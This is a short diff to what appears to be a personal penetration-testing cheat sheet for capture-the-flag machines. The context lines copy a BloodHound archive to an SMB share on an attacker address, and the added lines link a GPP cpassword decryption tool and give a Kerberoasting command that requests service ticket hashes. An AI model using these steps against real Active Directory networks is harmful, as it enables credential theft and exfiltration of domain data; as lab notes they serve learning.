@@ -219,7 +219,9 @@ Password Protected SSH Private Key:
 		- Victim: 
 			- net use \\10.10.16.23\smb /u:df df
 			- copy 20220314100025_BloodHound.zip \\10.10.16.23\smb\
-
+	- Decrypting GPP (cpassword): https://github.com/t0thkr1s/gpp-decrypt?msclkid=92feef0bab9911ecbdd203a7143ce894
+	
+	- If kerberos is running on port 88 and we have an owned user account, you can get hash for admin by: python3 GetUserSPNS.py -request active.htb/SVC_TGS
  	- File/Folder enume:
 		- Check access of a file: icacls <filename or dir>
 		- Check ownership of a file: dir /q root.txt
